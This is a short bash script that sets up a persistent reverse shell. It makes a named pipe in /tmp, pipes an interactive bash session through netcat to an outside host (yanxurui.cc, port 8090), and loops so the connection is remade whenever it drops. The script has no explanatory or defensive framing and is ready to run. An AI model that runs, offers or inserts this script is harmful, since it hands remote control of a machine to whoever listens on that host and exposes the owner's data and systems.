mkfifo /tmp/tmp_fifo
backshell ()
{
	cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc yanxurui.cc 8090 > /tmp/tmp_fifo
}
while true
do
	date
    backshell
done
